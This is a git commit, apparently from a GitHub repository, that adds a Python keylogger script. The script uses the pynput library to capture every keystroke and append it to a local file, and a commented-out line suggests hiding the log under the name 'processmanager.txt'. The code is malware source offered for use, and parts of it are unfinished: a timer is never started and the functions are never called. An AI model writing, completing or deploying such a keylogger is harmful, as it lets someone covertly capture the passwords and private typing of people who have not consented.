6c1982f4dd9f312f0d05acd14f09122cf3e978d9
jasmine-rattan <39281830+jasmine-rattan@users.noreply.github.com>
2020-05-31 21:55:15 -0700

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,47 @@
+#!/usr/bin/python
+
+import pynput.keyboard
+import threading
+import os
+
+log = ""
+#path = os.environ['HOME'] + "/processmanager.txt"
+path = os.getcwd() + "/keystrokes.txt"
+def process_keys(key):
+    global log
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        elif key == key.right:
+            log = log + ""
+        elif key == key.left:
+            log = log + ""
+        elif key == key.up:
+            log = log + ""
+        elif key == key.down:
+            log = log + ""
+        else:
+            log = log + " " + str(key) + " "
+
+    print(log)
+
+
+    # with open("log.txt","a") as fin:
+    #     fin.write(str(key))
+
+def report():
+    global log
+    global path
+
+    f = open(path, "a")
+    f.write(log)
+    log = ""
+    f.close()
+    timer = threading.Timer(10,report)
+
+def start():
+    keyboard_listener = pynput.keyboard.Listener(on_press = process_keys)
+    with keyboard_listener:
+        keyboard_listener.join()
